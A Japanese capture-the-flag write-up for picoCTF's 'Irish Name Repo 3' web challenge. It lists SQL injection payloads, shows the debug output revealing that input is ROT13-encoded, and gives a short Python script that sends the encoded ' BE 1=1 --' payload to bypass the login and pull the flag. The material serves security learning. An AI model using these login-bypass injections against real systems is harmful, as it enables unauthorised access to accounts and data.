---
title: 'IrishNameRepo3 - picoCTF'
description: 'Irish Name Repo3のWriteupです。'
pubDate: 2026-01-05
category: 'CTF'
tags: ['picoCTF', 'Writeup', 'Web', 'SQLi', 'SQLite', 'CaesarCipher']
---

# IrishNameRepo3 - picoCTF

## 初期調査

```html
password: ' OR 1 = 1 --
Warning: SQLite3::query(): Unable to prepare statement: 1, near "BE": syntax error in /var/www/html/login.php on line 20

Fatal error: Uncaught Error: Call to a member function fetchArray() on boolean in /var/www/html/login.php:21 Stack trace: #0 {main} thrown in /var/www/html/login.php on line 21
```
BEという文字が表示されている。

post requestをよく見てみると `debug=0` という文字が出ている。  
値を1にするとクエリー全体が見える。

```html
password: ' OR 1 = 1 --
SQL query: SELECT * FROM admin where password = '' BE 1 = 1 --'
```

もう少しいろんな出力を確認する。

```py
payload = [
  "'",
  "' OR 'a'='a'--",
  "' OR 1=1 --",
  "' OR password LIKE '%'-- ",
]
for i in range(len(payload)):
  data = {
    "password": payload[i],
    "debug": "1"
  }
  req = s.post(urljoin(URL, endpoint), data=data)
  print(req.text)
```
実行:
```bash
'' BE 'n'='n'--'
'' BE 1=1 --'
'' BE cnffjbeq YVXR '%'-- '
```

この結果をみると暗号化されていることがわかる。  
読めそうで読めない暗号`rot13`だ。  
そのまま BE が OR になるので出力されたものを返す。

## Exploit
```py
import requests
from urllib.parse import *
import re

URL = "http://challenge-host"
s = requests.Session()

endpoint = "/login.php"
payload = "' BE 1=1 --"
data = {
  "password": payload,
  "debug": "1"
}
req = s.post(urljoin(URL, endpoint), data=data)

flag = re.search(r"picoCTF\{[^}]+\}", req.text).group(0)
print(flag)
```
実行:
```bash
$ python3 exploit.py
picoCTF{***}
```